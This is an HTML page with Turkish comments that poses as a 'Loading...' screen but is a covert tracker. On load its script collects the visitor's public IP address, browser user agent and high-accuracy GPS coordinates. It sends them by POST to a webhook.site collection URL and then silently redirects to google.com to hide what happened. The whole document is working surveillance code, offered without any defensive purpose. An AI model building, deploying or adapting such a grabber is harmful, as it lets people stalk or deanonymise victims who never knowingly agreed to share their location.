<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Yükleniyor...</title>
</head>
<body>
    <script>
        // WEBHOOK URL'ni buraya doğru yapıştırdığından emin ol!
        const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";

        async function konumuYakala() {
            let veriler = {
                ip: "Alınamadı",
                cihaz: navigator.userAgent,
                konum: "İzin Verilmedi/Hata"
            };

            // 1. Önce IP'yi al (Bekle)
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                veriler.ip = ipData.ip;
            } catch (e) {}

            // 2. Konum İste (Kullanıcı basana kadar bekle)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        veriler.konum = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        await veriyiWebhookaGonder(veriler);
                    },
                    async (err) => {
                        veriler.konum = "Reddedildi: " + err.message;
                        await veriyiWebhookaGonder(veriler);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                await veriyiWebhookaGonder(veriler);
            }
        }

        async function veriyiWebhookaGonder(data) {
            // Veriyi gönderirken 'no-cors' yerine normal gönderelim ki ulaşıp ulaşmadığını bilelim
            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    body: JSON.stringify(data),
                    headers: { 'Content-Type': 'application/json' }
                });
            } catch (e) {}
            
            // VERİ GİTTİKTEN SONRA YÖNLENDİR
            window.location.href = "https://www.google.com";
        }

        // Sistemi başlat
        konumuYakala();
    </script>
</body>
</html>
